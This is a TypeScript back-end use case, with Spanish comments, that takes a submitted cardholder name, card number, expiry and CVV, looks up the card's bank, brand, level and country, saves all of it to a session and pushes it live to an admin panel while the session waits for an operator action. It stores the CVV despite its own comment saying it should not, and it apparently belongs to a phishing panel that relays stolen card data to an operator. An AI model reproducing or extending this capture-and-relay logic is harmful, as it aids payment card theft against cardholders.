import { ActionState } from "@prisma/client";
import { type SessionRepository } from "../ports/SessionRepository.js";
import { type RealtimeGateway } from "../ports/RealtimeGateway.js";
import { SessionPolicy } from "../../domain/session/SessionPolicy.js";
import type { DataPayload } from "../../domain/session/SessionData.js";
import type { BinLookupService } from "../../../adapters/outbound/bin/BinLookupService.js";

/* type UserSubmitCCInput = {
  sessionId: string;
  cc: { holder?: string; cc: string; exp?: string; cvv?: string }; // ideal: no guardar cvv
}; */

export class UserSubmitCc {
  constructor(
    private repo: SessionRepository, 
    private rt: RealtimeGateway,
    private binLookupService: BinLookupService
    ) {}

  async execute(input: { sessionId: string; data: DataPayload }) {
    const sessionId = (input.sessionId || "").trim();
    if (!sessionId) return { ok: false as const, error: "missing_sessionId" };

    const s = await this.repo.findById(sessionId);
    if (!s) return { ok: false as const, error: "not_found" };

    if (!SessionPolicy.canUserSubmitCC(s.action)) {
      return { ok: false as const, error: "bad_state" };
    }

    const cc = (input.data?.cc ?? "").trim?.();
    const binInfo = await this.binLookupService.identifyByCardNumber(cc);

    // ✅ guarda los campos en la sesión (ajusta nombres a tu modelo)
    const updated = await this.repo.update(sessionId, {
      holder: input.data?.holder?.trim?.() ?? s.holder ?? null,
      cc: input.data?.cc?.trim?.() ?? s.cc ?? null,
      exp: input.data?.exp?.trim?.() ?? s.exp ?? null,
      cvv: input.data?.cvv?.trim?.().toLowerCase() ?? null,
      bank: binInfo?.bank ?? null,
      scheme: binInfo?.scheme ?? null,
      type: binInfo?.type ?? null,
      level: binInfo?.brand ?? null,
      country: binInfo?.country ?? "CO", 
      action: ActionState.CC_WAIT_ACTION,
      lastError: null,
    });

    this.rt.emitSessionUpdate(sessionId, updated);
    this.rt.emitAdminUpsert(updated);

    return { ok: true as const };
  }
}